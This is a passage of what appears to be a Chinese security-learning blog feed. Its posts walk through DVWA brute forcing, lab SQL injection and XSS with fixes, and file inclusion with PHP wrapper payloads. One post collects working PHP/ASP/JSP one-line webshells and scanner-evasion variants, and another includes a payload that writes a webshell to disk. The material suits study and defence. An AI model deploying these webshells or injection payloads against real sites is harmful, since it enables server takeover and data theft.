<h2 id="brute-force-medium">Brute Force-Medium</h2>
<p>当账号密码错误时，页面延迟两秒再显示，猜测后台存在延时<code>sleep()</code>函数，同样使用burpsuite爆破<br>
<img src="https://z0ekball.github.io/post-images/image-20220415005904983.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415005959183.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415010005414.png" alt="" loading="lazy"><br>
取最长返回页面为正确账号密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220415010014265.png" alt="" loading="lazy"></p>
<h2 id="brute-force-high">Brute Force-High</h2>
<p>抓包发现增加了一个<code>user-token</code>，增加了爆破难度<br>
<img src="https://z0ekball.github.io/post-images/image-20220415010018654.png" alt="" loading="lazy"><br>
选中爆破目标，选择爆破方式<code>Pitchfork</code><br>
<img src="https://z0ekball.github.io/post-images/image-20220415010022386.png" alt="" loading="lazy"><br>
设置字典<br>
<img src="https://z0ekball.github.io/post-images/image-20220415010026049.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415010034265.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415010128796.png" alt="" loading="lazy"><br>
设置<code>单线程</code><br>
<img src="https://z0ekball.github.io/post-images/image-20220415010244279.png" alt="" loading="lazy"><br>
开始爆破，得到密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220415010251470.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[SQL注入、XSS漏洞简单复现与修复]]></title>
        <id>https://z0ekball.github.io/post/jian-dan-fu-xian-sqlxss-lou-dong/</id>
        <link href="https://z0ekball.github.io/post/jian-dan-fu-xian-sqlxss-lou-dong/">
        </link>
        <updated>2021-09-15T07:18:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="sql注入">SQL注入</h2>
<h3 id="复现">复现</h3>
<h4 id="环境">环境：</h4>
<pre><code>Apache  2.4.39
MySQL  5.0.96
PHP  5.5.9
</code></pre>
<h4 id="代码">代码：</h4>
<p>Connect.php用于连接已有的数据库<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001328673.png" alt="" loading="lazy"></p>
<p>简陋的sql漏洞网站就搭成了<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001341568.png" alt="" loading="lazy"></p>
<p>抓包进行post传参，检测是否存在漏洞</p>
<h4 id="验证">验证</h4>
<p>username= 1' or 1&gt;0#&amp;password=1，成功登入，说明存在注入漏洞<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001353343.png" alt="" loading="lazy"></p>
<p>username=Dumb'order by 3#&amp;password=Dumb，三个注入点<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001400244.png" alt="" loading="lazy"></p>
<p>username=1' union select 1,2,3#&amp;password=1，回显点为2,3<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001406880.png" alt="" loading="lazy"></p>
<p>username=1' union select 1,2,database()#&amp;password=1，查库<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001411085.png" alt="" loading="lazy"></p>
<p>username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()limit 0,1#&amp;password=1，查表<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001414528.png" alt="" loading="lazy"></p>
<p>username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'limit 0,1#&amp;password=1，查列<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001417936.png" alt="" loading="lazy"></p>
<p>username=1' union select 1,2,group_concat(concat_ws('-',username,password)) from security.users#&amp;password=1，查字段<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001421336.png" alt="" loading="lazy"></p>
<h3 id="修复">修复</h3>
<p>采用<code>预编译</code>的方式修复sql漏洞</p>
<h4 id="代码-2">代码：</h4>
<p><img src="https://z0ekball.github.io/post-images/image-20220415002911790.png" alt="" loading="lazy"><br>
简陋的slq漏洞修复网站搭成了<br>
<img src="https://z0ekball.github.io/post-images/image-20220415002939430.png" alt="" loading="lazy">)</p>
<h4 id="验证-2">验证</h4>
<p>输入正确的账号和密码username=Dumb&amp;password=Dumb回显正常<br>
<img src="https://z0ekball.github.io/post-images/image-20220415002945310.png" alt="" loading="lazy"></p>
<p>输入万能密码username=1' or 1&gt;0#&amp;password=Dumb，失败<br>
<img src="https://z0ekball.github.io/post-images/image-20220415002949507.png" alt="" loading="lazy"></p>
<p>联合注入username=1'union select 1,2,3#&amp;password=Dumb，失败<br>
<img src="https://z0ekball.github.io/post-images/image-20220415002953596.png" alt="" loading="lazy"></p>
<p>Sql注入防御成功</p>
<h2 id="xss漏洞">XSS漏洞</h2>
<h3 id="复现-2">复现</h3>
<h4 id="环境-2">环境：</h4>
<pre><code>Apache  2.4.39
MySQL  5.0.96
PHP  5.5.9
</code></pre>
<h4 id="代码-3">代码：</h4>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415001606551.png" alt="" loading="lazy"></figure>
<p>简陋的xss漏洞网站搭成了<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001702624.png" alt="" loading="lazy"></p>
<h4 id="验证-3">验证</h4>
<p>输入xss<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001753617.png" alt="" loading="lazy"></p>
<pre><code>输入&lt;script&gt;alert('xss')&lt;/script&gt;，存在xss漏洞
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415001801617.png" alt="" loading="lazy"></figure>
<h3 id="修复-2">修复</h3>
<p>基于原漏洞文件，作如下修改即可<br>
<img src="https://z0ekball.github.io/post-images/image-20220415003101438.png" alt="" loading="lazy"></p>
<pre><code>输入&lt;script&gt;alert('xss')&lt;/script&gt;，xss攻击失败
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415003106157.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[简单木马]]></title>
        <id>https://z0ekball.github.io/post/jian-dan-mu-ma/</id>
        <link href="https://z0ekball.github.io/post/jian-dan-mu-ma/">
        </link>
        <updated>2021-08-10T11:12:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="一句话木马">一句话木马</h2>
<h3 id="原理">原理</h3>
<pre><code class="language-php"> &lt;?php @eval($_POST['pass']); ?&gt;
</code></pre>
<p><code>&lt;?php ?&gt;</code>：解析成php代码</p>
<p><code>@</code>：不报错</p>
<p><code>$_POST['pass']</code>：php里面几个超全局变量，<code>$_GET</code>、<code>$_POST</code>就是其中之一，意思为用post方法接收pass这个变量</p>
<p><code>eval()</code>：eval()把字符串作为PHP代码执行</p>
<p><code>整句意思</code>：post方式接收变量pass，若pass=echo 'a'，则代码就成了<code>&lt;?php eval(&quot;echo 'a';&quot;); ?&gt;</code>，也就是通过pass这个变量传入php代码为所欲为。</p>
<p>通过一句话木马，使用菜刀、蚁剑、冰蝎等强悍的工具，可以攻陷整个网站主机。</p>
<h3 id="常见一句话木马">常见一句话木马</h3>
<h4 id="基础款">基础款</h4>
<pre><code class="language-php">php的一句话木马：&lt;?php @eval($_POST['pass']);?&gt;
asp的一句话木马：&lt;%eval request (&quot;pass&quot;)%&gt;
aspx的一句话木马：&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
jsp的一句话木马：
&lt;%
if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());
%&gt;
</code></pre>
<h4 id="简单变型">简单变型</h4>
<p>php:</p>
<pre><code class="language-php">//绕过&lt;?
&lt;script language=&quot;php&quot;&gt;@eval($_POST[pass])&lt;/script&gt;
    
//assert函数
&lt;?php assert(@$_POST[pass]);?&gt;
    
//creat_function函数，传参到fun()并执行
&lt;?php
$fun = create_function('',$_POST['pass']);
$fun();
?&gt;
    
//call_user_func回调函数，绕过waf
&lt;?php
@call_user_func(assert,$_POST['pass']);
?&gt;

//preg_replace函数
&lt;?php
@preg_replace(&quot;/abcde/e&quot;, $_POST['pass'], &quot;abcdefg&quot;);
?&gt;

// file_put_contents函数,生成木马文件
&lt;?php
$test='&lt;?php $a=$_POST[&quot;pass&quot;];assert($a); ?&gt;';
file_put_contents(&quot;Trojan.php&quot;, $test);
?&gt;

//array数组
&lt;?php
$a='assert';
array_map(&quot;$a&quot;,$_REQUEST);
?&gt;
&lt;?php
$item['JON']='assert';
$array[]=$item;
$array[0]['JON']($_POST[&quot;pass&quot;]);
?&gt;

//php变量函数
&lt;?php
$a = &quot;eval&quot;;
$a(@$_POST['pass']);
?&gt;

</code></pre>
<h3 id="木马免杀">木马免杀</h3>
<h4 id="木马查杀">木马查杀</h4>
<p><code>文件内容查杀</code>：对脚本文件中所使用的关键词、高危函数、文件修改的时间、文件权限、文件的所有者以及和其它文件的关联性等多个维度的特征进行检测,即先建立一个恶意字符串特征库，同时对WEB文件修改时间，文件权限以及文件所有者等进行确认。容易误报，无法对加密或者经过特殊处理的Webshell文件进行检测。</p>
<p><code>网络请求查杀</code>：当木马被执行时，如果请求参数的值中存在某些危险函数、或者关键字，那么会被防护产品拦截，通过Webshell运行时使用的系统命令或者网络流量及状态的异常来判断动作的威胁程度。</p>
<p><code>日志分析查杀</code>：使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测 技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p>
<h4 id="木马免杀-2">木马免杀</h4>
<p><code>关键字绕过</code>：拆分关键字</p>
<p><code>构造函数</code>：构造一个函数，拼接成一句话木马</p>
<pre><code class="language-php">&lt;?php
function x()
{
    return $_POST['pass'];
}
eval(x());
?&gt;
</code></pre>
<p><code>注释隔断</code>：一般查杀会对高危函数的前后语句进行拼接并检测，注释符可以隔断这种拼接从而绕过检查</p>
<pre><code class="language-php">&lt;?php
function x()
{
    return &quot;/*sasas23123*/&quot;.$_POST['pass'].&quot;/*sdfw3123*/&quot;;
}
eval(x());
?&gt;
</code></pre>
<p><code>转码绕过</code>：转码特征值，再通过解码来执行相关语句</p>
<p><code>数组拼接</code>：利用数组拼接木马语句</p>
<pre><code class="language-php">&lt;?php
$b = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
$a = array($arrayName = ($arrayName =($arrayName = array('a' =&gt; $b($_POST['pass'])))));
?&gt;
</code></pre>
<p><code>工具利用</code>：传统方法利用菜刀管理webshell 的流量特征很明显，很容易被检测到，可使用流量加密的webshell工具，如冰蝎，来躲避流量监测。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[文件包含]]></title>
        <id>https://z0ekball.github.io/post/wen-jian-bao-han/</id>
        <link href="https://z0ekball.github.io/post/wen-jian-bao-han/">
        </link>
        <updated>2021-07-29T02:59:27.000Z</updated>
        <content type="html"><![CDATA[<p><code>漏洞原理</code>：include()、include_once()、require()、require_once()等函数可以直接以php格式执行包含文件的代码，不受文件格式限制。web应用这些函数，且包含的文件路径是由用户传输参数方式引入，用户访问被包含文件时该文件以php格式解析。攻击者需要知道文件存放的路径才能进行访问。</p>
<pre><code class="language-php">include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行
require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行
include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含
</code></pre>
<p><code>敏感路径</code>：</p>
<p>典型：</p>
<pre><code class="language-php">?page=a.php
?home=b.html
?file=content…
</code></pre>
<p>Windows：</p>
<pre><code class="language-php">C:\boot.ini //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件
C:\windows\repair\sam //存储 windows 系统初次安装的密码
C:\Program Files\mysql\my.ini //mysql 配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\windows\php.ini //php 配置信息
C:\windows\my.ini //mysql 配置文件
</code></pre>
<p>UNIX/Linux：</p>
<pre><code class="language-php">/etc/passwd
/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/usr/local/app/php5/lib/php.ini //PHP 相关配置
/etc/httpd/conf/httpd.conf //apache
/etc/php5/apache2/php.ini //ubuntu 系统的默认路径
</code></pre>
<h4 id="本地包含">本地包含</h4>
<p>1.txt和1.php在同一文件目录下，被包含文件无论什么格式都能解析成php</p>
<p>1.txt:</p>
<pre><code class="language-php">&lt;?php phpinfo();?&gt;
</code></pre>
<p>1.php:</p>
<pre><code class="language-php">&lt;?php
$b=$_GET['id'];
include($b);
?&gt;
</code></pre>
<p><code>playload</code>:</p>
<pre><code class="language-php">***/1.php?id=1.txt //返回phpinfo页面
</code></pre>
<h4 id="远程包含">远程包含</h4>
<p><code>条件</code>： 一般 PHP 默认关闭远程包含，开启远程文件包含功能需要在 php.ini 中修改：<br>
Allow_url_include = on、allow_url_fopen=on</p>
<p><code>playload</code>:</p>
<pre><code class="language-php">***/1.php?id=http:(文件绝对路径) 
</code></pre>
<h4 id="php伪协议">php伪协议</h4>
<p><code>file://</code>:</p>
<p>用于访问本地文件系统</p>
<p>条件(php.ini)： allow_url_fopen   off/on    allow_url_include off/on</p>
<pre><code class="language-php">file：//[文件的绝对路径和文件名]
    file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
file：//[文件的相对路径和文件名]
    file=./phpinfo.txt
file：//[http：//网络路径和文件名]
    file=http://127.0.0.1/phpinfo.txt 
</code></pre>
<p><code>php：//filter</code>：</p>
<p>用于读取源码并进行bash64编码输出；<br>
条件（php.ini）：allow_url_fope   off/on  allow_url_include off/on</p>
<pre><code class="language-php">php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码
（针对php文件需要base64编码）
</code></pre>
<p><code>php：//input</code>：</p>
<p>可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；<br>
条件(php.ini)：allow_url_fope   off/on     allow_url_include on</p>
<pre><code class="language-php">php://input + [POST DATA]执行php代码
</code></pre>
<p>有写入权限则可以写入一句话木马</p>
<pre><code class="language-php">php://input
[POST DATA部分]
&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;
</code></pre>
<p><code>php://stdin</code>:</p>
<p>只读，php://stdout 和 php://stderr 是只写的。</p>
<p><code>php://output</code>:是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
<p><code>php://fd</code>:允许直接访问指定的文件描述符。</p>
<p><code>zip://,bzip://,zlib://</code>:</p>
<p>压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p>
<p>条件：    allow_url_fope   off/on    allow_url_include off/on</p>
<pre><code class="language-php">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
bzip2://file.bz2
zlib://file.gz
</code></pre>
<p><code>data://</code>：</p>
<p>传递相应格式数据，用于执行php代码</p>
<p>条件：    allow_url_fope   on    allow_url_include on</p>
<pre><code class="language-php">data://text/plain,&lt;?php%20phpinfo();?&gt;
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
</code></pre>
<p><code>phar：//</code></p>
<p>与zip://类似，同样可以访问zip格式压缩包内容</p>
]]></content>
    </entry>
</feed>